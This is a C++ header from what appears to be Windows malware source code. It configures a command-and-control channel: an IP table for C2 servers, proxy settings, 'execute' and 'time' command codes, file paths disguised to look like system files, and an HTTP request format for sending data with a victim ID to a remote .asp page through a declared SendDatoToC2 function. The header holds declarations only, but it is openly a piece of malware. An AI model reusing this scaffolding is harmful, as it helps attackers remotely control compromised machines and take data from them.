// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#ifndef __C2_CORE__
#define __C2_CORE__

#include <fstream>
#include <memory>
#include <Windows.h>
#include <WinInet.h>

#include "Base64.h"
#include "Global.h"
#include "Utils.h"

// <<---------- BEGIN EASY CONFIGURATION ---------->>
#define TEMP_FILE_PATH						"\\Temp\\filer"
#define TIME_FILE_PATH						"\\inf\\netft429.pnf"

#define COMMAND_EXECUTE						'E'
#define COMMAND_TIME						'T'

#ifndef __TEST_ENVIRONMENT__
#define GROUP_COUNT							1
#define IP_COUNT							2
#else // __TEST_ENVIRONMENT__
#define GROUP_COUNT							1
#define IP_COUNT							1
#endif // __TEST_ENVIRONMENT__

#define HTTP_REQUEST_AGENT					L"you"

#define HTTP_PAGE_REQUEST_FORMAT			L"http://%s%s?%s=%s&%s=%s&state=%d"
#define HTTP_PAGE_GET_LOCATION				L"/ajax_modal/modal/data.asp"
#define HTTP_PAGE_PARAMETER_DATA			L"mydata"
#define HTTP_PAGE_PARAMETER_UID				L"uid"
// <<---------- END EASY CONFIGURATION ---------->>

extern WCHAR *g_C2_IP[GROUP_COUNT][IP_COUNT];
extern DWORD g_C2_accessType[GROUP_COUNT];
extern LPCWSTR g_C2_proxy[GROUP_COUNT];
extern LPCWSTR g_C2_proxyBypass[GROUP_COUNT];

BOOL SendDatoToC2(const WCHAR *c_lpszC2Data);

#endif